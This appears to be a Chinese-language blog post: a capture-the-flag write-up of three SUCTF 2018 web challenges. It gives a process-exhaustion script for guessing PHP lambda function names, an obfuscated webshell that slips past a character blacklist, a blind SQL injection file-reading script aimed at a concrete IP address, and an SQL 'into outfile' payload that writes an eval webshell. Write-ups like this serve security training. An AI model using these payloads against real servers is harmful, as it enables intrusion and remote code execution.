@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SUCTF-WEB | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="webwp" />
+  
+  
+  
+  
+  <meta name="description" content="比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。 12345suctf&#x2F;2018-web-multi_sqlsuctf&#x2F;2018-web-homeworksuctf&#x2F;2018-web-hateitsuctf&#x2F;2018-web-getshellsuctf&#x2F;2018-web-annonymous">
+<meta name="keywords" content="web,wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF-WEB">
+<meta property="og:url" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;05&#x2F;30&#x2F;SUCTF-WEB&#x2F;index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。 12345suctf&#x2F;2018-web-multi_sqlsuctf&#x2F;2018-web-homeworksuctf&#x2F;2018-web-hateitsuctf&#x2F;2018-web-getshellsuctf&#x2F;2018-web-annonymous">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;05&#x2F;30&#x2F;SUCTF-WEB&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;05&#x2F;30&#x2F;SUCTF-WEB&#x2F;2.png">
+<meta property="og:updated_time" content="2018-11-02T05:46:22.956Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;05&#x2F;30&#x2F;SUCTF-WEB&#x2F;1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-SUCTF-WEB" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      SUCTF-WEB
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/05/30/SUCTF-WEB/" class="article-date">
+	  <time datetime="2018-05-30T07:22:13.000Z" itemprop="datePublished">May 30, 2018</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">suctf/<span class="number">2018</span>-web-multi_sql</span><br><span class="line">suctf/<span class="number">2018</span>-web-homework</span><br><span class="line">suctf/<span class="number">2018</span>-web-hateit</span><br><span class="line">suctf/<span class="number">2018</span>-web-getshell</span><br><span class="line">suctf/<span class="number">2018</span>-web-annonymous</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><p>docker还是很方便，一键部署，示例annonymous</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull suctf/<span class="number">2018</span>-web-annonymous</span><br><span class="line">docker run -d -p <span class="number">6666</span>:<span class="number">80</span> suctf/<span class="number">2018</span>-web-annonymous</span><br></pre></td></tr></table></figure>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="annonymous"><a href="#annonymous" class="headerlink" title="annonymous"></a>annonymous</h2><p>php审计题，源码很短</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>首先使用了create_function函数创建了一个打印flag的函数并赋值给$MY<br>然后又随机命名了了一个执行$My的函数，那么我们有两个方法去打印flag<br>1.执行SUCTF_$hash()<br>2.执行$MY()<br>方法一中 openssl_random_pseudo_bytes(32)预测显然不可能<br>只能尝试爆破create_function()产生的函数名。本地测试打印$MY，发现函数名为%00lambda_1，且每访问一次+1。<br>如果%00lambda_x不是很大。我们可以不停访问一个很大的值n，让x增长到n即可。<br>如果已经x很大，那么这个办法就不行了，就需要让apache开启新的进程使得x从一开始。<br>用上现成POC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">        PORT = <span class="number">12344</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">'GET / HTTP/1.1\nHost: 127.0.0.1\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
+<p>修改HOST和端口，然后运行脚本，apache会不断kill掉旧进程fork新进程，访问%00lambda_1得到flag</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>绕过waf上传文件getshell，列出后台的waf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$black_char = <span class="keyword">array</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>,<span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>, </span><br><span class="line"><span class="string">'*'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, </span><br><span class="line"><span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'\\'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>,  <span class="string">'|'</span>, <span class="string">'+'</span> , <span class="string">'&#123;'</span> , <span class="string">'&#125;'</span>,<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure>
+<p>做法：<br>~(X) 当X为一个汉字时对这个汉字取反第二位可以得到得到一个英文字符，我们利用这个性质构造webshell。<br>eval是一种语言结构而不是函数，所以不能使用变量函数来调用它.这里可以使用asser代替。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$______=_;</span><br><span class="line">$_=~(瞰);</span><br><span class="line">$__=$_[$_==$_];</span><br><span class="line">$_=~(范);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(范);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(皮);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(半);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(拉);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(为);</span><br><span class="line">$___=$_[$_==$_];</span><br><span class="line">$_=~(了);</span><br><span class="line">$___=$___.$_[$_==$_];</span><br><span class="line">$_=~(高);</span><br><span class="line">$___=$___.$_[$_==$_];</span><br><span class="line">$___=$______.$___;</span><br><span class="line">$_=$$___;<span class="comment">//$_=Array</span></span><br><span class="line">$__($_[_])<span class="comment">//$__=assert</span></span><br></pre></td></tr></table></figure>
+<p>密码是_<br>执行命令system(%27cat%20./../../../../Th1s_14_f14g%27)拿到flag</p>
+<h2 id="MultiSql"><a href="#MultiSql" class="headerlink" title="MultiSql"></a>MultiSql</h2><p>注册进去后在用户信息中找到注入点，进行盲注</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.131.107.84:8588/user/user.php?id=2-(mid(user(),1,1)&gt;binary(0x2a))</span><br></pre></td></tr></table></figure>
+<p>过滤了select等东西，又提示flag不再数据库中，尝试读文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">code=<span class="string">''</span></span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'6tq2gt2c31o1reeq4j962sodt6'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">255</span>):</span><br><span class="line">        url=<span class="string">'http://104.131.107.84:8588/user/user.php?id=2-(mid(load_file(0x2f7661722f7777772f68746d6c2f757365722f757365722e706870),%d,1)=binary(%s))'</span>%(i,hex(j))</span><br><span class="line">        r=requests.get(url=url,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            code+=hex(j)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">print</span> code</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>将文件以16进制打印出来，然后转换成文本。<br>发现user.php是使用mysqli_multi_query进行查询的.<br>mysqli_multi_query:执行多个针对数据库的查询<br>所以这里应该就是写shell的地方。<br>为了绕过select和单引号，我们使用MYSQL预处理语句:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql = concat(<span class="string">'create table '</span>,newT,<span class="string">' like '</span>,old);</span><br><span class="line">prepare s1 <span class="keyword">from</span> @sql;</span><br><span class="line">execute s1;</span><br></pre></td></tr></table></figure>
+<p>将</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="string">"&lt;?php @eval($_POST['a']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/favicon/altman.php'</span>;</span><br></pre></td></tr></table></figure>
+<p>进行编码<br>贴上一个编码脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="string">''</span></span><br><span class="line">a=<span class="string">'''select "&lt;?php @eval($_POST['a']);?&gt;" into outfile '/var/www/html/favicon/altman.php';'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a)):</span><br><span class="line">    b+=<span class="string">'CHAR('</span>+str(ord(a[i]))+<span class="string">'),'</span></span><br><span class="line"><span class="keyword">print</span> b</span><br></pre></td></tr></table></figure>
+<p>然后写入<br><img src="/2018/05/30/SUCTF-WEB/1.png" alt=""><br>执行命令拿到flag<br><img src="/2018/05/30/SUCTF-WEB/2.png" alt=""></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/06/18/DC0531CTF-WP/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DC0531CTF-WP
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/05/28/CSTS-AWD/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CSTS-AWD-XI&#39;AN</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境部署"><span class="nav-number">1.</span> <span class="nav-text">环境部署</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#annonymous"><span class="nav-number">2.1.</span> <span class="nav-text">annonymous</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">2.2.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MultiSql"><span class="nav-number">2.3.</span> <span class="nav-text">MultiSql</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/friend" class="mobile-nav-link">Friend</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 Altm4nz All Rights Reserved.
+        
+            <span id="busuanzi_container_site_uv">  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
